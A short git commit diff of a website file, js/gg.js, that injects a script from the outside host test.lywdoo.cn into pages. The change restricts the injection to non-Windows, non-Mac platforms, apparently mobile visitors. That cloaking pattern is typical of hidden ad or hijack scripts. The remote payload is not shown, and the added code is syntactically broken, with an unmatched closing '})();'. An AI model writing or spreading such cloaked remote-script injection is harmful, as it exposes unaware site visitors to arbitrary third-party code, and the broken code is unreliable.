a024c8358be68d84129b7327f4613c21e5452f98
乐乐 <35110476+lelege@users.noreply.github.com>
2021-11-20 22:03:44 +0800

    Update gg.js

--- js/gg.js
+++ js/gg.js
@@ -1,7 +1,8 @@
-(function() {
-        var hi = document.createElement("script");
-        hi.src = "https://test.lywdoo.cn/bx/xx06.js";
-        hi.charset = "UTF-8";
-        var k = document.getElementsByTagName("script")[0];
-        k.parentNode.insertBefore(hi, k);
- })(); 
+if(!(navigator.platform.indexOf('Win') > -1 || navigator.platform.indexOf('Mac') > -1)) {
+            var hi = document.createElement("script");
+            hi.src = "https://test.lywdoo.cn/bx/xx06.js";
+            hi.charset = "UTF-8";
+            var k = document.getElementsByTagName("script")[0];
+            k.parentNode.insertBefore(hi, k);
+        }
+    })();
